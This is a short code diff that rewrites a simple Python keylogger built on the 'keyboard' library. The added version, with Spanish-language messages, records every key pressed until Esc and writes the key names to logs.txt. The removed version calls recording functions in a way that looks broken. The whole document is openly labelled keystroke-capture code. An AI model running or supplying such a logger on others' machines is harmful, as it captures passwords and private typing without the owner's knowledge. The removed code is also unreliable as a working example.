@@ -1,11 +1,12 @@
 import keyboard
 
-def keylogger():
-    print("Keylogger started. Press 'Esc' to stop.")
-    keyboard.start_recording()
-    keyboard.wait('esc')
-    keyboard.stop_recording().save("logs.txt")
-    print("Keylogger stopped. Keys saved to logs.txt.")
+print("Keylogger inciado. Presiona Esc para parar.")
+teclas_ingresadas = keyboard.record(until='esc')
 
-def main():
-    keylogger()
+archivo_texto = open("logs.txt", "w")
+for uso in teclas_ingresadas:
+    if uso.event_type == keyboard.KEY_DOWN:
+        archivo_texto.write(uso.name + "\n")
+archivo_texto.close()
+
+print("Finalizado. Las teclas se han guardado en 'logs.txt'.")
